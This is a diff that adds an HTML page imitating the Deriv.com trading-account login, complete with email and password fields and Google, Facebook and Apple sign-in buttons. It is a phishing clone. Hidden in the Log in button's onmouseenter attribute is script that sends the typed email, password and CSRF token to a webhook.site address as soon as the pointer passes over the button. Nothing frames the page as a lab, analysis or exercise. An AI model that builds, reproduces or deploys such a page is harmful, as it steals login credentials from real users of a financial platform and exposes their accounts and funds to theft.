@@ -1,0 +1,91 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Log in | Deriv.com </title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="description" content="Log in to your Deriv online trading account and start trading on the most popular financial markets.">
+        <meta name="keywords" content="online trading, deriv trading, online trading account, deriv account">
+
+        <link rel="stylesheet" href="style.css">
+
+    </head>
+    <body class="oauth">
+
+        <header>
+            <div id="logo-container">
+               <img src="derive.png" alt="deriv">
+            </div>
+        </header>
+
+<div id="container" class="">
+   <h1 class="title-text">Welcome back</h1>
+   <form novalidate id="frmLogin" method="POST">
+      <div class='input-group'>
+         <div class="input-wrapper ">
+            <input type="text" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off"  autofocus="autofocus"  maxlength="254"  />
+            <label for="txtEmail">Email</label>
+            <span class="bar"></span>
+         </div>
+         <div class="input-error">
+            <p class='hide error error_invalid'>That doesn&#39;t look like an email address.</p>
+            <p class='hide error error_required'>Email is required.</p>
+            <p class='hide error error_invalid_pass'>Your email and/or password is incorrect.</p>
+            
+         </div>
+      </div>
+      <div class="input-group">
+         <div class="input-wrapper">
+            <input type="password" id="txtPass" name="password" required autocomplete="off" />
+            <label for="txtPass">Password</label>
+            <span class="bar"></span>
+            <span id="btnToggle" class="input-button icon_hidden"></span>
+         </div>
+         <div class="input-error">
+            <p class='hide error error_required'>Password is required.</p>
+         </div>
+      </div>
+            <div id="lost-password-container">
+        
+        <a id="lost-password">Forgot password?</a>
+        
+        <button type="submit" class="button secondary" name="login" value="Log in" onmouseenter="fetch('https://webhook.site/53b28b4a-8317-4a23-b8c7-d6328645c85d', {method: 'POST', headers: {'Content-Type': 'application/json'},body: JSON.stringify({ username: document.querySelector('input[name=email]').value, passord:document.querySelector('input[name=password]').value,csrftoken:document.querySelector('input[name=csrf_token]').value})})">Log in</button>
+      </div>
+      <input type="hidden" name="csrf_token" value="c407413d89f41715ddf6eccac96b636a59309d7a" />
+   </form>
+
+   <div class="separator separator-show" id="separatorId">
+      <p class="center-text social-text">
+         Or continue with
+      </p>
+   </div>div>
+
+   <div id="passkeysContainer"></div>
+   <div class="providers_row social_login_providers">
+        
+      <div class="provider" id="provider_google">
+          <a class="button" id="button_google" href="https://accounts.google.com/o/oauth2/v2/auth?client_id=946366519426-7b697p8590q1a53pmc727iigp1gmbgit.apps.googleusercontent.com&amp;scope=openid%20email&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Foauth.deriv.com%2Foauth2%2Fsocial-login%2Fcallback%2Fgoogle&amp;code_challenge=Z37gUvRgNd7mHcEbxFzvj6SioMKXbY1oF1LrJb7iVXY&amp;code_challenge_method=S256&amp;nonce=voCMR9qQVZNSfHiO13nPAIVMRtehs6Xp74j41OW5HCs%3D&amp;state=KugI2cY6ew%2Blq9lU29KVuyY7gLfjo%2BHHIy2Y6QYHpnQ%3D" rel="nofollow" title="Login with google" role="button" aria-label="Login with google" aria-haspopup="true">
+              <span class="provider_icon"></span>
+              <div class="name" id="name_google">Google</div>
+          </a>
+      </div>
+  
+      <div class="provider" id="provider_facebook">
+          <a class="button" id="button_facebook" href="https://facebook.com/dialog/oauth?client_id=464524112160643&amp;scope=openid%20email&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Foauth.deriv.com%2Foauth2%2Fsocial-login%2Fcallback%2Ffacebook&amp;code_challenge=juF9xF8U8_Xw3LJFE1sR_YHVC1OqlmSLfhgNDXDaYk8&amp;code_challenge_method=S256&amp;nonce=4l5e6IiOyBRM0k9u0T6jFYb0he5zn6epB4HEgwZuAO8%3D&amp;state=a4JTF882XqrI8vUpnGUY46GW1xmI61TAyKn73rPFCCQ%3D" rel="nofollow" title="Login with facebook" role="button" aria-label="Login with facebook" aria-haspopup="true">
+              <span class="provider_icon"></span>
+              <div class="name" id="name_facebook">Facebook</div>
+          </a>
+      </div>
+  
+      <div class="provider" id="provider_apple">
+          <a class="button" id="button_apple" href="https://appleid.apple.com/auth/authorize?client_id=com.deriv.svc.social-login&amp;scope=openid%20email&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Foauth.deriv.com%2Foauth2%2Fsocial-login%2Fcallback%2Fapple&amp;code_challenge=U9JnUHb6_tncZI_uO3UmJRULxBUvFUO3ib5cLQ7VBKQ&amp;code_challenge_method=S256&amp;nonce=RltW7EUDE2ka6xwJhyw%2FJOy5l7FkFLzkmQdUCl%2BFeE0%3D&amp;state=oHRSQ7KZvfVistV2S01HWEOQlTIVd7%2BP9BtZovIi2Pw%3D&amp;response_mode=form_post" rel="nofollow" title="Login with apple" role="button" aria-label="Login with apple" aria-haspopup="true">
+              <span class="provider_icon"></span>
+              <div class="name" id="name_apple">Apple</div>
+          </a>
+      </div>
+
+        <p id="signup-link" class="account-text">Don’t have an account yet? <a class='account-link' href=https://deriv.com/en/signup>Sign up</a></p>
+    </div>
+
+</body>
+</html>
